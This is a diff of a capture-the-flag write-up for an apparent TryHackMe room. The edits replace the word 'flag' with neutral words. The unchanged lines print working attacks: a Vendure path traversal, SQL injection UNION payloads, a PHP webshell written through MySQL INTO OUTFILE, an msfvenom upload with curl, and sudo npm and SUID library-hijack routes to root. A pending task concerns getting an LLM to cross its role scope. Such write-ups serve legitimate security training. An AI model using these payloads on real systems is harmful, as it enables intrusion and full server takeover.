@@ -14,7 +14,7 @@ The live room (`tryhackme.com/room/dehlimeetup`) is 11 tasks across Web, Network
 
 ## Task 2 — Asset Server (Web, 60 pts)
 
-**Target.** Vendure 3.0.4 (headless e-commerce). Express frontend on :80 reverse-proxies `/assets/*` to Vendure on :3001 via `http-proxy-middleware`. Flag at `/flag.txt`, one dir above Vendure's asset root.
+**Target.** Vendure 3.0.4 (headless e-commerce). Express frontend on :80 reverse-proxies `/assets/*` to Vendure on :3001 via `http-proxy-middleware`. Target file at `/flag.txt`, one dir above Vendure's asset root.
 
 **Bug.** `@vendure/asset-server-plugin` **CVE-2024-56357** — path traversal in the asset handler. Request path is joined onto the asset root after URL-decoding, so encoded `../` escapes unchecked.
 
@@ -59,7 +59,7 @@ Nested variant also lands: `middleware:middleware:middleware:middleware:middlewa
 
 ## Task 5 — Stolen Footprints (Networking)
 
-*Writeup pending — add the pcap/traffic analysis path and the artefact(s) that produced the flag.*
+*Writeup pending — add the pcap/traffic analysis path and the artefact(s) that produced the answer.*
 
 ---
 
@@ -71,7 +71,7 @@ Nested variant also lands: `middleware:middleware:middleware:middleware:middlewa
 
 Next.js dev build leaks source paths (`/home/ubuntu/csportal/src/pages/{login,home}/index.js`) and endpoints `/api/login`, `/api/bill`, `/api/logout`.
 
-### Web flag — SQLi in `/api/bill`
+### Web — SQLi in `/api/bill`
 
 Bill-lookup form POSTs `{"NumReference": "<n>"}`. Numeric, unquoted — no quote escape needed.
 
@@ -91,12 +91,12 @@ Bill-lookup form POSTs `{"NumReference": "<n>"}`. Numeric, unquoted — no quote
 → bill, flag, users
 
 {"NumReference":"0 UNION SELECT flag,2,3 FROM bill_app_db.flag"}
-→ web flag text
+→ row contents of bill_app_db.flag
 ```
 
 `/api/login` returns full matching user row but has a hard-coded guest-only branch that rejects multi-row responses — dead end. `/api/bill` is the real sink.
 
-### User flag — MySQL FILE → PHP webshell
+### User — MySQL FILE → PHP webshell
 
 `root@localhost` with FILE priv, empty `secure_file_priv`. `LOAD_FILE` is AppArmor-restricted (`/etc/passwd` + `/etc/mysql/my.cnf` work, `/home/*` + `/etc/ssh/sshd_config` + `/proc/mounts` return NULL). But `INTO OUTFILE` to `/var/www/html/` is allowed.
 
@@ -108,7 +108,7 @@ Hex payload is `<?php system($_GET["c"]); ?>`. API responds *"User not found"* (
 
 `find / -name user.txt 2>/dev/null` → `/var/www/user.txt`. Also leaked: `/home/ubuntu/csportal/.env` → `MYSQL_PASSWORD=root@123`.
 
-### Root flag — sudo npm, done right for modern npm
+### Root — sudo npm, done right for modern npm
 
 `sudo -l` as www-data: `(root) NOPASSWD: /usr/bin/npm *`. npm 8.19.4.
 
@@ -157,7 +157,7 @@ msfvenom -p linux/x64/exec \
 curl -X POST http://TARGET/dev/upload.php -F "file=@/tmp/mal"
 ```
 
-Leaks: `uid=33(www-data)`, host `tryhackme-2404` (Ubuntu 24.04), `/home/{agent,ubuntu}` unreadable, **user flag at `/opt/user.txt`**.
+Leaks: `uid=33(www-data)`, host `tryhackme-2404` (Ubuntu 24.04), `/home/{agent,ubuntu}` unreadable, **user answer file at `/opt/user.txt`**.
 
 ### Root — SUID `/opt/agent/scanner` + libscan.so hijack
 
@@ -214,7 +214,7 @@ cp /tmp/libscan.so /opt/agent/libscan.so
 chmod 755 /opt/agent/libscan.so
 /opt/agent/scanner      # SUID loads our .so, constructor runs as root
 cat /tmp/root_pwn
-# → uid=0(root) ... + root flag text
+# → uid=0(root) ... + contents of /root/root.txt
 ```
 
 All bundles into a single msfvenom `CMD=` payload for one-shot upload.
@@ -235,7 +235,7 @@ All bundles into a single msfvenom `CMD=` payload for one-shot upload.
 
 ## Task 9 — BankGPT (LLM)
 
-*Writeup pending — add the model's authorised actions, the privilege/role scope that had to be crossed, and the exact chat turns that produced the flag.*
+*Writeup pending — add the model's authorised actions, the privilege/role scope that had to be crossed, and the exact chat turns that produced the answer.*
 
 ---
 
@@ -247,7 +247,7 @@ All bundles into a single msfvenom `CMD=` payload for one-shot upload.
 
 ## Task 11 — Exposed (Coding)
 
-*Writeup pending — Europe (Ireland) region required. Add the exposed data-source, the parsing that extracted the flag, and the solution script.*
+*Writeup pending — Europe (Ireland) region required. Add the exposed data-source, the parsing that extracted the answer, and the solution script.*
 
 ---
 
